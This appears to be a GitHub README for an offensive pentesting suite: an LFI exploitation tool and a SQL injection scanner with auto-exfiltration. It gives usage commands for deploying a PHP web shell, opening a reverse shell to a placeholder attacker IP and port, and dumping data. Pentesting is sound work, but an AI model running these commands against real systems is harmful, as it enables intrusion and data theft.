# SD-DEVSECOPS: Advanced Pentesting Checkers Suite

![Python Version](https://img.shields.io/badge/python-3.x-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Category](https://img.shields.io/badge/category-Pentesting-red.svg)

A collection of high-performance, automated security tools designed for rapid enumeration, vulnerability discovery, and exploitation. Built for professionals and security researchers.

---

## 🛠️ Included Tools

### 1. LFI-FILLER (v3.1)
The ultimate framework for Local File Inclusion discovery and exploitation.
- **Key Features**: Multi-threaded, WAF Bypasses, PHP Filter Chaining, Log/SSH Poisoning, Automated Shells.
- **Main Script**: `lfiller.py`
- **[Quick Usage Guide Pin](#-lfi-filler-v31-quick-usage)**

### 2. SD-QLi (v1.1)
High-speed SQL injection scanner and automated exfiltration tool.
- **Key Features**: Error/Time/Boolean-blind detection, UNION column discovery, Auto-Data Dump, WAF Tamper scripts.
- **Main Script**: `sd-qli.py`
- **[Quick Usage Guide Pin](#-sd-qli-v10-quick-usage)**

---

## 🚀 LFI-FILLER v3.1 Quick Usage

Scan and attempt to deploy a PHP web shell:
```bash
python3 lfiller.py -u "http://target.com/view.php" -webshell
```

Reverse shell via LHost:
```bash
python3 lfiller.py -u "http://target.com/view.php" -lh YOUR_IP -lp 4444
```

---

## 🚀 SD-QLi v1.1 Quick Usage

Fast scan and automated data exfiltration:
```bash
python3 sd-qli.py -u "http://target.com/products.php?id=1"
```

POST-based injection test:
```bash
python3 sd-qli.py -u "http://target.com/login.php" -m POST -d "user=admin&pass=123"
```

---

## 🧪 Advanced Features Comparison

| Feature | LFI-FILLER | SD-QLi |
|---------|------------|-------------|
| **Multi-threading** | ✅ | ✅ |
| **WAF Bypass** | ✅ (Encoding) | ✅ (Tamper) |
| **RCE Vectors** | 10+ | ✅ (Outfile/CMDShell) |
| **Auto-Exploitation** | ✅ | ✅ |
| **OSCP Ready** | ✅ | ✅ |

## 📦 Installation

```bash
git clone https://github.com/SD-DEVSECOPS/CHECKERS.git
cd CHECKERS
pip install requests
```

## ⚠️ Disclaimer

This suite is for educational purposes and authorized penetration testing only. Unauthorized use against systems you do not have permission to test is illegal. The author is not responsible for any misuse or damage caused by these utilities.

---
**Maintained by SD-DEVSECOPS**
